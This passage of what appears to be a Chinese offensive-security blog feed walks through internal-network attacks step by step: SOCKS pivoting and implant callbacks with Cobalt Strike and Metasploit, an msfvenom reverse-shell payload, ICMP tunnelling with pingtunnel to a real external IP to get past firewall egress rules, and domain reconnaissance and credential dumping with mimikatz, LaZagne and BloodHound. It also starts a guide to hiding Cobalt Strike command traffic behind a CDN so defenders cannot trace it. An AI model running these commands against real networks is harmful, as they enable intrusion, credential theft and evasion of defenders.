title="Server2008通讯&amp;上线"></a>Server2008通讯&amp;上线</h2><p>前面已经拿到Win10的shell了那么后面主机的通讯问题解决方案也和上面相同</p><h3 id="CS通讯-amp-上线"><a href="#CS通讯-amp-上线" class="headerlink" title="CS通讯&amp;上线"></a>CS通讯&amp;上线</h3><p>既然已经拿到win10已经上线了那么可以直接使用socks代理<br><img src="/posts/c4250965/image-20220917192353737.png" alt="image-20220917192353737"><br><img src="/posts/c4250965/image-20220917192601813.png" alt="image-20220917192601813"><br><img src="/posts/c4250965/image-20220917192607786.png" alt="image-20220917192607786"><br>成功通讯，上线操作也和上文相同 直接把上文生成的马传到server2008运行执行connect命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.22.131 9090</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917193416637.png" alt="image-20220917193416637"></p><p><img src="/posts/c4250965/image-20220917193255443.png" alt="image-20220917193255443"></p><h3 id="MSF通讯-amp-上线"><a href="#MSF通讯-amp-上线" class="headerlink" title="MSF通讯&amp;上线"></a>MSF通讯&amp;上线</h3><p>来到win10的shell添加路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917194155018.png" alt="image-20220917194155018"></p><p>建立socks代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 2244</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917194355153.png" alt="image-20220917194355153"></p><p>接下来上线思路和上文相同直接用上文的马,只需改监听器目标即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.131</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917194646969.png" alt="image-20220917194646969"></p><h2 id="Server2012通讯-amp-上线"><a href="#Server2012通讯-amp-上线" class="headerlink" title="Server2012通讯&amp;上线"></a>Server2012通讯&amp;上线</h2><h3 id="CS通讯-amp-上线-1"><a href="#CS通讯-amp-上线-1" class="headerlink" title="CS通讯&amp;上线"></a>CS通讯&amp;上线</h3><p>思路依旧<br><img src="/posts/c4250965/image-20220917195540934.png" alt="image-20220917195540934"><br><img src="/posts/c4250965/image-20220917200019135.png" alt="image-20220917200019135"></p><p>建立通讯完成<br>传马 connect命令<br><img src="/posts/c4250965/image-20220917200153974.png" alt="image-20220917200153974"><br>成功上线</p><h3 id="MSF通讯-amp-上线-1"><a href="#MSF通讯-amp-上线-1" class="headerlink" title="MSF通讯&amp;上线"></a>MSF通讯&amp;上线</h3><p>一样的思路<br>server2008添加路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917200328474.png" alt="image-20220917200328474"></p><p>建立socks</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 2233</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917200615556.png" alt="image-20220917200615556"></p><p>传马改监听器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.33.130</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917200817033.png" alt="image-20220917200817033"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>借助socks代理技术可以实现对不出网设备进行通讯和上线，CS和msf俩个工具能用CS就用CS操作方便很多，本文环境主要联系代理实现通讯以及上线，实战环境中比这复杂的多，会有防火墙等设备进行拦截，并且能否传马都需要根据环境进行判断，如果防火墙对tcp流量进行了拦截那么就要用到隧道技术</p><p><img src="/posts/c4250965/image-20220917201341746.png" alt="image-20220917201341746"></p><p><img src="/posts/c4250965/image-20220917201310403.png" alt="image-20220917201310403"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网基础-防火墙规则&amp;组策略</title>
      <link href="/posts/a5e10218/"/>
      <url>/posts/a5e10218/</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础-防火墙规则-amp-组策略"><a href="#内网基础-防火墙规则-amp-组策略" class="headerlink" title="内网基础-防火墙规则&amp;组策略"></a>内网基础-防火墙规则&amp;组策略</h1><p>代理技术和隧道技术分别是什么?</p><ul><li>隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</li><li>代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）<br>连接方向：正向&amp;反向</li></ul><h2 id="单机-防火墙-限制端口出入站"><a href="#单机-防火墙-限制端口出入站" class="headerlink" title="单机-防火墙-限制端口出入站"></a>单机-防火墙-限制端口出入站</h2><p>熟悉常见主机配置不出网的方式</p><p><strong>1、入站&amp;出站&amp;连接安全</strong></p><p>入站即：从外部到内部 如：访问web界面<br>出站即：从内部到外部 如：反向连接shell<br><strong>2、域&amp;专用&amp;公网&amp;状态</strong><br><img src="/posts/a5e10218/image-20220915151933356.png" alt="image-20220915151933356"><br>域:适用在域环境<br>专用:个人环境<br>公用:公共环境<br><strong>3、阻止&amp;允许&amp;其他配置</strong><br><img src="/posts/a5e10218/image-20220915152715593.png" alt="image-20220915152715593"></p><p>程序:针对单个程序进行阻止或者放行<br>端口:针对端口进行阻止或者放行<br>预定义：windows预先设定好的规则<br>自定义:根据自己的需要设定针对程序或端口或协议<br>基础知识已经了解接下来进行测试<br>生成一个监听器为reverse_http的马 端口为8989<br><img src="/posts/a5e10218/image-20220915160019407.png" alt="image-20220915160019407"><br>reverse为反向连接马，bind为正向连接马</p><p>在系统防火墙出站规则限制8989端口<br>运行木马发现没有任何反应，禁用该规则成功上线。<br>木马没有上线的原因就是触发了防火墙规则</p><h2 id="单机-防火墙-限制协议出入站"><a href="#单机-防火墙-限制协议出入站" class="headerlink" title="单机-防火墙-限制协议出入站"></a>单机-防火墙-限制协议出入站</h2><p>添加一条出站规则限制tcp协议 禁止所有tcp协议出站<br><img src="/posts/a5e10218/image-20220915162002946.png" alt="image-20220915162002946"><br>运行木马毫无反应禁用规则重新上线<br><img src="/posts/a5e10218/image-20220915162155407.png" alt="image-20220915162155407"><br>没上线的原因就是触发了tcp协议出站规则<br>限制了tcp协议就没办法上线了么？<br>当然不是的，还可以使用其他协议上线，如下图<br><img src="/posts/a5e10218/w7Lt8eZS5MbUVc3q6nB8gw.png" alt="img"><br><img src="/posts/a5e10218/RTIqD7VEfBePEbjmTbWmtg-1663116129810-3.png" alt="img"><br>学过计网应该知道这些，每层协议都是基于下面一层 如果下面的禁用了上面的也就完蛋，tcp被禁用，还可以使用icmp进行上线，下文中会提到</p><h2 id="域控-防火墙-组策略对象同步"><a href="#域控-防火墙-组策略对象同步" class="headerlink" title="域控-防火墙-组策略对象同步"></a>域控-防火墙-组策略对象同步</h2><p>操作：组策略管理-域-创建GPO链接-防火墙设置<br>域控进入组策略管理<br><img src="/posts/a5e10218/image-20220915164450719.png" alt="image-20220915164450719"><br>在域中创建GPO链接 名称随意<br><img src="/posts/a5e10218/image-20220915164514425.png" alt="image-20220915164514425"></p><p>创建完成后右键编辑进入到策略设置<br><img src="/posts/a5e10218/image-20220915164758655.png" alt="image-20220915164758655"><br>配置防火墙规则禁用tcp协议(记得开启防火墙)<br>域成员更新策略：强制&amp;命令&amp;重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate/force</span><br></pre></td></tr></table></figure><p><img src="/posts/a5e10218/image-20220915170227761.png" alt="image-20220915170227761"><br><img src="/posts/a5e10218/image-20220915170551477.png" alt="image-20220915170551477"></p><h2 id="域控-防火墙-组策略不出网上线"><a href="#域控-防火墙-组策略不出网上线" class="headerlink" title="域控-防火墙-组策略不出网上线"></a>域控-防火墙-组策略不出网上线</h2><p><strong>背景介绍</strong>：域控通过组策略设置防火墙规则同步后，域内用户主机被限制TCP出网，其中规则为出站规则，安全研究者通过入站取得SHELL权限，需要对其进行上线控制。<br><strong>思路：</strong>正向连接&amp;隧道技术<br><strong>如果是入站被限制呢？</strong>反向连接&amp;隧道技术也可以解决（前提看限制的多不多）<br>注意域成员主机可出网<br>实战情况下的两种情况:</p><ul><li>主机出站TCP封杀入站没有无互联网网络<br>正向连接（取得一台有网络的能和主机通讯的服务器权限他有网）<br>把数据给出网的机器通过出网机器正向主动控制他</li><li>主机出站TCP封杀入站没有有互联网网络<br>正向连接（取得一台有网络的能和主机通讯的服务器权限他有网）<br>隧道技术（走其他协议出网即可）</li></ul><p>因为域成员主机收到防火墙策略影响可以ping通baidu.com但是不能访问百度(tcp限制)<br>所以可以利用ICMP协议进行上线</p><p>ICMP协议项目：</p><p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a><br><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a><br>利用思路:<br>就是利用木马将上线流量发送到本地工具端口，工具转换为ICMP流量转到攻击机，攻击机使用工具将收到的icmp流量转化为tcp流量，攻击机接收到上线tcp流量从而上线<br>举例：木马为127.0.0.1 4444端口 ,肉鸡工具监听本地4444端口接收到tcp流量，然后转换为icmp流量发送到攻击机6666端口，攻击机工具将icmp流量转为tcp流量而监听器刚好监听本机6666端口从而上线</p><h4 id="1、CS-ICMP-上线"><a href="#1、CS-ICMP-上线" class="headerlink" title="1、CS-ICMP-上线"></a>1、CS-ICMP-上线</h4><p>这里利用pingtunnel</p><p>攻击机:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server</span><br></pre></td></tr></table></figure><p>肉鸡：(管理器运行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:5555 -s 192.168.46.66 -t 192.168.46.66:6666 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure><p>CS:</p><p>创建两个监听器 一个为127.0.0.1 一个为攻击机ip</p><p><img src="/posts/a5e10218/image-20220915230950801.png" alt="image-20220915230950801"></p><p>生成127.0.0.1的Stager后门<br>肉鸡执行<br><img src="/posts/a5e10218/image-20220915231213985.png" alt="image-20220915231213985"><br>成功上线</p><h4 id="2、MSF上线"><a href="#2、MSF上线" class="headerlink" title="2、MSF上线"></a>2、MSF上线</h4><p>生成后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f exe &gt; xd.exe</span><br></pre></td></tr></table></figure><p>MSF启动监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure><p>攻击机开启隧道：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果运行报错 <span class="built_in">chmod</span> 777 pingtunnel</span></span><br><span class="line">./pingtunnel -type server</span><br></pre></td></tr></table></figure><p><img src="/posts/a5e10218/image-20220915225516712.png" alt="image-20220915225516712"></p><p>肉鸡开启隧道 –将本地3333端口 icmp协议数据转发到攻击机的4444端口流量上(管理员运行)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:3333 -s 101.35.21.250 -t 101.35.21.250:4444 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure><p>运行msf生成的木马</p><p><img src="/posts/a5e10218/image-20220915225800488.png" alt="image-20220915225800488"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域信息收集</title>
      <link href="/posts/225ec2c9/"/>
      <url>/posts/225ec2c9/</url>
      
        <content type="html"><![CDATA[<h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h2 id="什么是域环境"><a href="#什么是域环境" class="headerlink" title="什么是域环境"></a>什么是域环境</h2><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，并区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器(DC)，域控制器(DC)中保存着整个域的用户帐号和安全数据库。</p><p>0x01</p><p>一个具有一定规模的企业，每天都可能面临员工入职和离职，因此网络管理部门经常需要对域成员主机进行格式化消除磁盘的文件，然后重装系统及软件，以提供给新员工使用；因此，为了便于后期交接，大多网络管理员会做好一个系统镜像盘，统一安装所有的电脑，并且在安装的时候设置惯用、甚至统一的密码。</p><p>0x02</p><p>因此，域中的计算机本地管理员账号，极有可能能够登陆域中较多的计算机，本地管理员的密码在服务器上后期修改的概率，远低于在个人办公电脑上的概率，而域用户权限是较低的，是无法在域成员主机上安装软件的，这将会发生下面的一幕：</p><p>某个域用户需要使用viso软件进行绘图操作，于是联系网络管理员进行安装，网络管理员采用域管理员身份登录了域成员主机，并帮助其安装了viso软件，于是这个有计算机基础的员工，切换身份登录到了本地计算机的管理员，后执行mimikatz，从内存当中抓取了域管理员的密码，便成功的控制了整个域。</p><p>0x03</p><p>因此，域渗透的思路就是：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</p><p>当前机器角色的判断–个人PC&amp;文件服务器&amp;邮件服务器等<br>当前机器网络环境判断–局域网&amp;工作组&amp;域环境<br>当前机器角色功能判断–任务&amp;端口&amp;服务&amp;密码&amp;漏洞&amp;配置等</p><h2 id="常规信息类收集-应用-amp-服务-amp-权限等"><a href="#常规信息类收集-应用-amp-服务-amp-权限等" class="headerlink" title="常规信息类收集-应用&amp;服务&amp;权限等"></a>常规信息类收集-应用&amp;服务&amp;权限等</h2><p><img src="/posts/225ec2c9/eetivl27t4uy4YiieUguOQ.png" alt="eetivl27t4uy4YiieUguOQ"><br><img src="/posts/225ec2c9/9dxsuZWjbEPQMl2vx1HSBA.png" alt="9dxsuZWjbEPQMl2vx1HSBA"></p><p>更多其他收集见上图命令表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">systeminfo #详细信息</span><br><span class="line">netstat -ano #端口列表</span><br><span class="line">route print #路由表</span><br><span class="line">net start #启动服务</span><br><span class="line">tasklist #进程列表</span><br><span class="line">schtasks #计划任务</span><br><span class="line">ipconfig /all #判断存在域</span><br><span class="line">net view /domain #判断存在域</span><br><span class="line">net time /domain #判断主域</span><br><span class="line">netstat -ano #当前网络端口开放</span><br><span class="line">nslookup 域名 #追踪来源地址</span><br><span class="line">wmic service list brief #查询本机服务</span><br><span class="line">net config workstation  #查询当前登录域及登录用户信息</span><br><span class="line">wmic startup get command,caption #查看已启动的程序信息</span><br></pre></td></tr></table></figure><h2 id="架构信息类收集-网络-amp-用户-amp-域控等"><a href="#架构信息类收集-网络-amp-用户-amp-域控等" class="headerlink" title="架构信息类收集-网络&amp;用户&amp;域控等"></a>架构信息类收集-网络&amp;用户&amp;域控等</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net view /domain #查询域列表</span><br><span class="line">net time/domain #从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务</span><br><span class="line">net localgroup administrators #本机管理员【通常含有域用户】</span><br><span class="line">net user /domain #查询域用户(当前域)</span><br><span class="line">net group /domain #查询域工作组</span><br><span class="line">net group &quot;domain computers&quot; /domain #查看加入域的所有计算机名</span><br><span class="line">net group &quot;domain admins&quot; /domain #查询域管理员用户组和域管用户</span><br><span class="line">net localgroup administrators /domain #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain #查看域控</span><br><span class="line">net accounts /domain #查看域密码策略</span><br></pre></td></tr></table></figure><h2 id="关键信息类收集-密码-amp-凭据-amp-口令等"><a href="#关键信息类收集-密码-amp-凭据-amp-口令等" class="headerlink" title="关键信息类收集-密码&amp;凭据&amp;口令等"></a>关键信息类收集-密码&amp;凭据&amp;口令等</h2><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>计算机用户HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)，CS插件</p><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a><br><a href="https://github.com/AlessandroZ/LaZagne/">https://github.com/AlessandroZ/LaZagne/</a><br><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a><br><a href="https://xenarmor.com/allinone-password-recovery-pro-software/">https://xenarmor.com/allinone-password-recovery-pro-software/</a></p></blockquote><p>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库Web管理入口，如PHPMyAdmin<br>3.浏览器保存密码、浏览器Cookies<br>4.其他用户会话、3389和ipc$连接记录、回收站内容<br>5.Windows 保存的WIFI密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等<br>利用CS抓取明文密码需要先提权<br>提权:利用CS插件<br><img src="/posts/225ec2c9/image-20220912105234985.png" alt="image-20220912105234985"><br>提权完成后抓取明文密码<br><img src="/posts/225ec2c9/image-20220912105515362.png" alt="image-20220912105515362"><br>在视图中开启密码凭证<br><img src="/posts/225ec2c9/image-20220912105555583.png" alt="image-20220912105555583"></p><h2 id="自动化工具探针-插件-amp-Adfind-amp-BloodHound"><a href="#自动化工具探针-插件-amp-Adfind-amp-BloodHound" class="headerlink" title="自动化工具探针-插件&amp;Adfind&amp;BloodHound"></a>自动化工具探针-插件&amp;Adfind&amp;BloodHound</h2><blockquote><p><a href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p></blockquote><p>CS插件:LSTAR Ladon OLa TaoWu等<br>上传Adfind进行自动化信息搜集<br><img src="/posts/225ec2c9/image-20220912110250086.png" alt="image-20220912110250086"></p><p>Adfind常见命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出域控制器名称</span></span><br><span class="line">AdFind -sc dclist </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中在线的计算机</span></span><br><span class="line">AdFind -sc computers_active</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中在线的计算机(只显示名称和操作系统)</span></span><br><span class="line">AdFind -sc computers_active name operatingSystem</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中所有计算机</span></span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询当前域中所有计算机(只显示名称和操作系统)</span></span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询域内所有用户</span></span><br><span class="line">AdFind -users name</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查询所有GPO</span></span><br><span class="line">AdFind -sc gpodmp </span><br></pre></td></tr></table></figure><p><img src="/posts/225ec2c9/image-20220912123714674.png" alt="image-20220912123714674"></p><p>BloodHound域分析使用</p><blockquote><p>BloodHound 是一个强大的内网域渗透提权分析工具，构建于 <a href="http://linkurio.us/">Linkurious</a> 之上。BloodHound 采用了原始的 PowerPath 概念背后的一些关键概念，并将这些概念放在一个能运行且直观，并易于使用的功能中，用于提取和分析数据，可以高效准确地显示如何提升 AD 域中的权限。它可以显示两个域中的 “域管理员” 组的有效成员。</p></blockquote><p>安装&amp;使用：</p><blockquote><p><a href="http://cn-sec.com/archives/146548.html">http://cn-sec.com/archives/146548.html</a><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p></blockquote><p>上传SharpHound.exe(\resources\app\Collectors下)到服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><p><img src="/posts/225ec2c9/image-20220912124235379.png" alt="image-20220912124235379"></p><p>会生成一个压缩包</p><p>本地启动分析</p><p>1、启动neo4j 下载好后直接运行即可</p><blockquote><p><a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><p>启动完成到<a href="http://localhost:7474/browser/%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81">http://localhost:7474/browser/修改密码</a></p><p>2、启动BloodHound 直接运行 BloodHound.exe<br>账号密码为就是neo4j的账号密码<br>3、运行程序后将生成数据导入，筛选查看<br><img src="/posts/225ec2c9/image-20220912143847126.png" alt="image-20220912143847126"><br>上传刚才生成的压缩包<br><img src="/posts/225ec2c9/image-20220912143921209.png" alt="image-20220912143921209"><br>点击左上角展开菜单<br><img src="/posts/225ec2c9/image-20220912144033107.png" alt="image-20220912144033107"></p><p>Analysis为所有功能<br><img src="/posts/225ec2c9/image-20220912144311135.png" alt="image-20220912144311135"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Find all Domain Admins  #找到所有域管理员</span><br><span class="line">Find Shortest Paths to Domain Admins #找到域管理员的最短路径</span><br><span class="line">Find Principals with DCSync Rights #查找具有DCSync权限的主体</span><br><span class="line">Users with Foreign Domain Group Membership #具有外部域组成员资格的用户</span><br><span class="line">Groups with Foreign Domain Group Membership #具有外国域组成员的组</span><br><span class="line">Map Domain Trusts #映射领域信托</span><br><span class="line">Shortest Paths to Unconstrained Delegation Systems #无约束委托系统的最短路径 </span><br><span class="line">Shortest Paths from Kerberoastable Users 从kerberostabable #用户的最短路径</span><br><span class="line">Shortest Paths to Domain Admins from Kerberoastable Users #从kerberostable用户到域管理员的最短路径</span><br><span class="line">Shortest Path from Owned Principals #从所有主体出发的最短路径</span><br><span class="line">Shortest Paths to Domain Admins from Owned Principals #从所属主体到域管理员的最短路径</span><br><span class="line">Shortest Paths to High Value Targets #到高价值目标的最短路径</span><br><span class="line">Find Computers where Domain Users are Local Admin #查找域用户为本地管理员的计算机</span><br><span class="line">Find Computers where Domain Users can read LAPS passwords #查找域用户可以读取LAPS密码的计算机</span><br><span class="line">Shortest Paths from Domain Users to High Value Targets #从域用户到高价值目标的最短路径</span><br><span class="line">Find All Paths from Domain Users to High Value Targets #找到从域用户到高值目标的所有路径</span><br><span class="line">Find Workstations where Domain Users can RDP #找到域用户可以RDP的工作站</span><br><span class="line">Find Servers where Domain Users can RDP #找到域用户可以RDP的服务器</span><br><span class="line">Find Dangerous Rights for Domain Users Groups #查找域用户组的危险权限</span><br><span class="line">Find Kerberoastable Members of High Value Groups #查找高值组中可支持kerberos的成员</span><br><span class="line">List all Kerberoastable Accounts #列出所有可kerberos的帐户</span><br><span class="line">Find Kerberoastable Users with most privileges #查找具有最多特权的可支持kerberostaber的用户</span><br><span class="line">Find Domain Admin Logons to non-Domain Controllers #找到非域控制器的域管理登录</span><br><span class="line">Find Computers with Unsupported Operating Systems #查找操作系统不受支持的计算机</span><br><span class="line">Find AS-REP Roastable Users (DontReqPreAuth) #查找AS-REP烘烤用户(DontReqPreAuth)</span><br></pre></td></tr></table></figure><p>点击可查看详细信息<br><img src="/posts/225ec2c9/image-20220912145106437.png" alt="image-20220912145106437"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike流量隐匿</title>
      <link href="/posts/a28d2b5c/"/>
      <url>/posts/a28d2b5c/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike流量隐匿"><a href="#CobaltStrike流量隐匿" class="headerlink" title="CobaltStrike流量隐匿"></a>CobaltStrike流量隐匿</h1><h2 id="防朔源拉黑-CDN节点"><a href="#防朔源拉黑-CDN节点" class="headerlink" title="防朔源拉黑-CDN节点"></a>防朔源拉黑-CDN节点</h2><h4 id="1、在godaddy注册账号，买个域名"><a href="#1、在godaddy注册账号，买个域名" class="headerlink" title="1、在godaddy注册账号，买个域名"></a>1、在godaddy注册账号，买个域名</h4><p><a href="https://sg.godaddy.com/">https://sg.godaddy.com/</a></p><h4 id="2、在cloudflare注册账号-然后添加域名"><a href="#2、在cloudflare注册账号-然后添加域名" class="headerlink" title="2、在cloudflare注册账号,然后添加域名"></a>2、在cloudflare注册账号,然后添加域名</h4><p><a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a><br><img src="/posts/a28d2b5c/image-20220905230534596.png" alt="image-20220905230534596"><br><img src="/posts/a28d2b5c/image-20220905230629036.png" alt="image-20220905230629036"><br>这里只是测试选不要钱的实战尽量选择付费的节点多一点</p><h4 id="3、添加解析记录，指向CS的IP"><a href="#3、添加解析记录，指向CS的IP" class="headerlink" title="3、添加解析记录，指向CS的IP"></a>3、添加解析记录，指向CS的IP</h4><p><img src="/posts/a28d2b5c/image-20220906085905127.png" alt="image-20220906085905127"><br>type选择A Name随便 IPv4为自己的cs服务端地址  保存继续</p><h4 id="4、配置DNS服务器，使用cloudflare"><a href="#4、配置DNS服务器，使用cloudflare" class="headerlink" title="4、配置DNS服务器，使用cloudflare"></a>4、配置DNS服务器，使用cloudflare</h4><p>按照说明配置DNS服务器<br><img src="/posts/a28d2b5c/image-20220905231040010.png" alt="image-20220905231040010"><br>先去godaddy修改域名服务器–进入到域名DNS管理往下拉<br><img src="/posts/a28d2b5c/image-20220905231515063.png" alt="image-20220905231515063"><br><img src="/posts/a28d2b5c/image-20220905231605856.png" alt="image-20220905231605856"><br>修改为cloudflare显示的内容，修改完成后回到cloudflare 点击进行检测<br><img src="/posts/a28d2b5c/image-20220905231743974.png" alt="image-20220905231743974"><br><img src="/posts/a28d2b5c/image-20220905231849382.png" 